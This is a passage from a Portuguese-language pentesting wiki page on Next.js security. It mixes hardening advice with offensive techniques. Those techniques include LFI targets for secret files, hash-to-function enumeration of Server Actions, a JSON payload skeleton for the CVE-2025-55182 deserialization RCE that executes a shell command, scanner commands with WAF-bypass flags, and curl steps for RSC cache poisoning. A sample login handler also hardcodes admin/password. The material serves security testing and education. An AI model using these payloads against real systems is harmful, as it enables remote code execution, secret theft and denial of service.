- **Nunca exponha Secrets no Cliente:** Garanta que variáveis sensíveis sejam usadas apenas no lado do servidor.

**Exemplo:**
```javascript
// next.config.js
module.exports = {
env: {
API_KEY: process.env.API_KEY, // Accessible on both client and server
SECRET_KEY: process.env.SECRET_KEY, // Be cautious if accessible on the client
},
}
```
**Note:** Para restringir variáveis apenas ao lado do servidor, omita-as do objeto `env` ou prefixe-as com `NEXT_PUBLIC_` para exposição ao cliente.

### Artefatos de servidor úteis para visar via LFI/download endpoints

Se você encontrar um path traversal ou download API em um app Next.js, mire em artefatos compilados que leak segredos do lado do servidor e a lógica de autenticação:

- `.env` / `.env.local` para segredos de sessão e credenciais do provedor.
- `.next/routes-manifest.json` and `.next/build-manifest.json` para uma lista completa de rotas.
- `.next/server/pages/api/auth/[...nextauth].js` para recuperar a configuração compilada do NextAuth (frequentemente contém senhas de fallback quando os valores `process.env` não estão definidos).
- `next.config.js` / `next.config.mjs` para revisar reescritas, redirecionamentos e roteamento de middleware.

### Autenticação e Autorização

**Abordagem:**

- **Autenticação baseada em sessão:** Utilize cookies para gerenciar sessões de usuário.
- **Autenticação baseada em tokens:** Implemente JWTs para autenticação sem estado.
- **Provedores de terceiros:** Integre com provedores OAuth (e.g., Google, GitHub) usando bibliotecas como `next-auth`.

**Práticas de Segurança:**

- **Cookies seguros:** Defina os atributos `HttpOnly`, `Secure` e `SameSite`.
- **Hash de senhas:** Sempre aplique hash nas senhas antes de armazená-las.
- **Validação de entrada:** Previna ataques de injeção validando e sanitizando entradas.

**Exemplo:**
```javascript
// pages/api/login.js
import { sign } from "jsonwebtoken"
import { serialize } from "cookie"

export default async function handler(req, res) {
const { username, password } = req.body

// Validate user credentials
if (username === "admin" && password === "password") {
const token = sign({ username }, process.env.JWT_SECRET, {
expiresIn: "1h",
})
res.setHeader(
"Set-Cookie",
serialize("auth", token, {
path: "/",
httpOnly: true,
secure: true,
sameSite: "strict",
})
)
res.status(200).json({ message: "Logged in" })
} else {
res.status(401).json({ error: "Invalid credentials" })
}
}
```
### Otimização de Desempenho

**Estratégias:**

- **Otimização de Imagens:** Use o componente `next/image` do Next.js para otimização automática de imagens.
- **Divisão de Código:** Aproveite importações dinâmicas para dividir o código e reduzir o tempo de carregamento inicial.
- **Cache:** Implemente estratégias de cache para respostas de API e recursos estáticos.
- **Carregamento sob demanda:** Carregue componentes ou recursos apenas quando necessários.

**Exemplo:**
```jsx
// Dynamic Import with Code Splitting
import dynamic from "next/dynamic"

const HeavyComponent = dynamic(() => import("../components/HeavyComponent"), {
loading: () => <p>Loading...</p>,
})
```
## Next.js Server Actions Enumeração (hash para nome da função via source maps)

Next.js moderno usa “Server Actions” que são executadas no servidor, mas são invocadas a partir do cliente. Em produção essas invocações são opacas: todos os POSTs chegam a um endpoint comum e são distinguidos por um hash específico da build enviado no cabeçalho `Next-Action`. Exemplo:
```http
POST /
Next-Action: a9f8e2b4c7d1...
```
Quando `productionBrowserSourceMaps` está habilitado, os chunks JS minificados contêm chamadas para `createServerReference(...)` que causam leak de estrutura suficiente (além dos source maps associados) para recuperar um mapeamento entre o hash da action e o nome original da função. Isso permite traduzir hashes observados em `Next-Action` para alvos concretos como `deleteUserAccount()` ou `exportFinancialData()`.

### Abordagem de extração (regex em minified JS + source maps opcionais)

Procure nos chunks JS baixados por `createServerReference` e extraia o hash e o símbolo de função/fonte. Dois padrões úteis:
```regex
# Strict pattern for standard minification
createServerReference\)"([a-f0-9]{40,})",\w+\.callServer,void 0,\w+\.findSourceMapURL,"([^"]+)"\)

# Flexible pattern handling various minification styles
createServerReference[^\"]*"([a-f0-9]{40,})"[^\"]*"([^"]+)"\s*\)
```
- Group 1: server action hash (40+ hex chars)
- Group 2: símbolo ou caminho que pode ser resolvido para a função original via o source map quando presente

Se o script anunciar um source map (comentário no trailer `//# sourceMappingURL=<...>.map`), busque-o e resolva o símbolo/caminho para o nome da função original.

### Fluxo de trabalho prático

- Descoberta passiva durante a navegação: intercepte requisições com cabeçalhos `Next-Action` e URLs de chunks JS.
- Recupere os bundles JS referenciados e os arquivos `*.map` acompanhantes (quando presentes).
- Rode a regex acima para construir um dicionário hash↔nome.
- Use o dicionário para direcionar testes:
  - Triagem orientada por nome (ex.: `transferFunds`, `exportFinancialData`).
  - Acompanhe a cobertura entre builds pelo nome da função (hashes rotacionam entre builds).

### Exercitando ações ocultas (requisição baseada em template)

Pegue um POST válido observado no proxy como template e troque o valor `Next-Action` para direcionar outra action descoberta:
```http
# Before
Next-Action: a9f8e2b4c7d1

# After
Next-Action: b7e3f9a2d8c5
```
Reproduza no Repeater e teste autorização, validação de entrada e lógica de negócio de ações que seriam inacessíveis de outra forma.

### Burp automation

- NextjsServerActionAnalyzer (extensão Burp) automatiza o acima no Burp:
- Vasculha o histórico do proxy em busca de JS chunks, extrai entradas `createServerReference(...)` e analisa source maps quando disponíveis.
- Mantém um dicionário pesquisável hash↔function-name e elimina duplicatas entre builds pelo nome da função.
- Pode localizar um POST de template válido e abrir uma aba pronta para enviar no Repeater com o hash da ação alvo substituído.
- Repo: https://github.com/Adversis/NextjsServerActionAnalyzer

### Notas e limitações

- Requer `productionBrowserSourceMaps` habilitado em produção para recuperar nomes de bundles/source maps.
- A divulgação do function-name por si só não é uma vulnerabilidade; use-a para orientar a descoberta e testar a autorização de cada ação.

### React Server Components Flight protocol deserialization RCE (CVE-2025-55182)

Next.js App Router deployments that expose Server Actions on `react-server-dom-webpack` **19.0.0–19.2.0 (Next.js 15.x/16.x)** contain a critical server-side prototype pollution during **Flight** chunk deserialization. By crafting `$` references inside a Flight payload an attacker can pivot from polluted prototypes to arbitrary JavaScript execution and then to OS command execution inside the Node.js process.

{{#ref}}
../../pentesting-web/deserialization/nodejs-proto-prototype-pollution/README.md
{{#endref}}

#### Cadeia de ataque em chunks Flight

1. **Prototype pollution primitive:** Set `"then": "$1:__proto__:then"` so that the resolver writes a `then` function on `Object.prototype`. Any plain object processed afterwards becomes a thenable, letting the attacker influence async control flow inside RSC internals.
2. **Rebinding to the global `Function` constructor:** Point `_response._formData.get` at `"$1:constructor:constructor"`. During resolution, `object.constructor` → `Object`, and `Object.constructor` → `Function`, so future calls to `_formData.get()` actually execute `Function(...)`.
3. **Code execution via `_prefix`:** Place JavaScript source in `_response._prefix`. When the polluted `_formData.get` is invoked, the framework evaluates `Function(_prefix)(...)`, so the injected JS can run `require('child_process').exec()` or any other Node primitive.

#### Esqueleto do payload
```json
{
"then": "$1:__proto__:then",
"status": "resolved_model",
"reason": -1,
"value": "{\"then\":\"$B1337\"}",
"_response": {
"_prefix": "require('child_process').exec('id')",
"_chunks": "$Q2",
"_formData": { "get": "$1:constructor:constructor" }
}
}
```
#### Mapeamento da exposição de React Server Functions

React Server Functions (RSF) são quaisquer funções que incluam a diretiva `'use server';`. Cada form action, mutation ou fetch helper vinculada a uma dessas funções torna-se um RSC Flight endpoint que irá desserializar facilmente payloads fornecidos por um atacante. Etapas de recon úteis derivadas de avaliações React2Shell:

- **Inventário estático:** procure pela diretiva para entender quantas RSFs estão sendo expostas automaticamente pelo framework.
```bash
rg -n "'use server';" -g"*.{js,ts,jsx,tsx}" app/
```
- **App Router defaults:** `create-next-app` habilita o App Router + o diretório `app/` por padrão, o que transforma silenciosamente cada rota em um endpoint compatível com RSC. Ativos do App Router como `/_next/static/chunks/app/` ou respostas que fazem streaming de chunks Flight via `text/x-component` são impressões digitais fortes voltadas para a Internet.
- **Implicitly vulnerable RSC deployments:** O próprio advisory do React observa que apps que incluem o runtime RSC podem ser exploráveis **mesmo sem RSFs explícitos**, então trate qualquer build que use `react-server-dom-*` 19.0.0–19.2.0 como suspeito.
- **Other frameworks bundling RSC:** Vite RSC, Parcel RSC, React Router RSC preview, RedwoodSDK, Waku, etc. reutilizam o mesmo serializador e herdam a mesma superfície de ataque remota até incorporarem builds do React com patch.

#### Cobertura de versões (React2Shell)

- `react-server-dom-webpack`, `react-server-dom-parcel`, `react-server-dom-turbopack`: **vulneráveis** em 19.0.0, 19.1.0–19.1.1 e 19.2.0; **corrigidos** em 19.0.1, 19.1.2 e 19.2.1 respectivamente.
- **Next.js stable:** releases do App Router 15.0.0–16.0.6 incorporam a stack RSC vulnerável. As trains de patch 15.0.5 / 15.1.9 / 15.2.6 / 15.3.6 / 15.4.8 / 15.5.7 / 16.0.7 incluem dependências corrigidas, então qualquer build abaixo dessas versões é de alto valor.
- **Next.js canary:** `14.3.0-canary.77+` também distribui o runtime com bug e atualmente carece de canary drops com patch, tornando essas impressões digitais fortes candidatas à exploração.

#### Oráculo de detecção remota

Assetnote’s [`react2shell-scanner`](https://github.com/assetnote/react2shell-scanner) envia uma requisição Flight multipart criada para caminhos candidatos e observa o comportamento no servidor:

- **Modo padrão** executa um payload RCE determinístico (operação matemática refletida via `X-Action-Redirect`) provando execução de código.
- **Modo `--safe-check`** malforma propositalmente a mensagem Flight de modo que servidores corrigidos retornem `200/400`, enquanto alvos vulneráveis emitem respostas `HTTP/500` contendo a substring `E{"digest"` no corpo. Esse par `(500 + digest)` é atualmente o oráculo remoto mais confiável publicado por defensores.
- As opções embutidas `--waf-bypass`, `--vercel-waf-bypass` e `--windows` ajustam o layout do payload, prefixam junk, ou trocam comandos do OS para que você possa sondar ativos reais da Internet.
```bash
python3 scanner.py -u https://target.tld --path /app/api/submit --safe-check
python3 scanner.py -l hosts.txt -t 20 --waf-bypass -o vulnerable.json
```
### Outros problemas recentes do App Router (final de 2025)

1. **RSC DoS & source disclosure (CVE-2025-55184 / CVE-2025-67779 / CVE-2025-55183)** – payloads Flight malformados podem fazer o resolvedor RSC entrar em loop infinito (pre-auth DoS) ou forçar a serialização do código compilado de Server Function para outras ações. Builds do App Router ≥13.3 são afetados até serem corrigidos; 15.0.x–16.0.x precisam das linhas de patch específicas do advisory upstream. Reutilize o caminho normal de Server Action, mas envie um body `text/x-component` com referências `$` abusivas. Por trás de um CDN a conexão travada é mantida aberta por timeouts de cache, tornando o DoS barato.
- **Dica de triagem:** Alvos não corrigidos retornam `500` com `E{"digest"` após payloads Flight malformados; builds corrigidos retornam `400/200`. Teste qualquer endpoint que já faça streaming de chunks Flight (procure por headers `Next-Action` ou respostas `text/x-component`) e reproduza com um payload modificado.

2. **RSC cache poisoning (CVE-2025-49005, App Router 15.3.0–15.3.2)** – a ausência de `Vary` permite que uma resposta `Accept: text/x-component` seja cacheada e servida a navegadores que esperam HTML. Uma única requisição de priming pode substituir a página por payloads RSC brutos. PoC flow:
```bash
# Prime CDN with an RSC response
curl -k -H "Accept: text/x-component" "https://target/app/dashboard" > /dev/null
# Immediately fetch without Accept (victim view)
curl -k "https://target/app/dashboard" | head
```
If the second response returns JSON Flight data instead of HTML, the route is poisonable. Purge cache after testing.

## References

- [Pentesting Next.js Server Actions — A Burp Extension for Hash-to-Function Mapping](https://www.adversis.io/blogs/pentesting-next-js-server-actions)
- [NextjsServerActionAnalyzer (Burp extension)](https://github.com/Adversis/NextjsServerActionAnalyzer)
- [CVE-2025-55182 React Server Components Remote Code Execution Exploit Tool](https://github.com/Spritualkb/CVE-2025-55182-exp)
- [CVE-2025-55182 & CVE-2025-66478 React2Shell – All You Need to Know](https://jfrog.com/blog/2025-55182-and-2025-66478-react2shell-all-you-need-to-know/)
- [0xdf – HTB Previous (Next.js middleware bypass, static export recon, NextAuth config leak)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [assetnote/react2shell-scanner](https://github.com/assetnote/react2shell-scanner)
- [Next.js Security Update: December 11, 2025 (CVE-2025-55183/55184/67779)](https://nextjs.org/blog/security-update-2025-12-11)
- [GHSA-r2fc-ccr8-96c4 / CVE-2025-49005: App Router cache poisoning](https://github.com/advisories/GHSA-r2fc-ccr8-96c4)

{{#include ../../banners/hacktricks-training.md}}
